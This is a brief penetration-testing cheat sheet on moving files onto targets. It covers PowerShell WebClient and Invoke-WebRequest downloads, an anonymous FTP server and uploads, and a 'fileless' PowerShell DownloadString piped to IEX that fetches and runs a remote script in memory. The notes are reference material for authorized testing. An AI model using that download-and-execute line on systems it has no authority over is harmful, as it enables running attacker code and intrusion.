---
title: "File Transfers for Penetration Testing"
date: 2024-07-30
---

---

# Windows

## Download Files using Powershell

The easiest way to download files using PowerShell is to use the `Net.WebClient` class. This class provides an intuitive way to download HTTP, HTTPS, and FTP files.

```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("http://example.com/file.txt", "C:\path\to\file.txt")
```

You can also use the Invoke-WebRequest cmdlet, which is the Windows equivalent of curl or wget. The -OutFile parameter specifies the download location.

```powershell
Invoke-WebRequest -Uri "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
# or
curl -Uri "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
# or
wget -Uri "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
```

## Download Fileless strings using Powershell

In rare cases, you may need to download a script without writing it to disk. This can be done using the Net.WebClient class and the DownloadString method. The IEX command is used to execute the downloaded content directly in memory.

```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadString("http://example.com/file.txt") | IEX
```

---

# Linux

---

# FTP

### Server

We can start an FTP server on a Linux or Windows machine using the following command. Just make sure to have the pyftpdlib package installed via pip or your preferred package manager:

```bash
sudo python3 -m pyftpdlib -i <IP> -p 21
```

### Client Download

Here’s how we can download a file from the FTP server:

```bash
ftp <IP>
UserName: anonymous
Password: anonymous
ftp> get <FileName>
```

or

```bash
wget ftp://<IP>/<FileName>
```

### Client Upload

````bash
ftp <IP>
UserName: anonymous
Password: anonymous
ftp> put <FileName>

```bash
curl -T localfile.txt ftp://anonymous:anonymous@ftp.<IP>/path/to/remote/file.txt
````

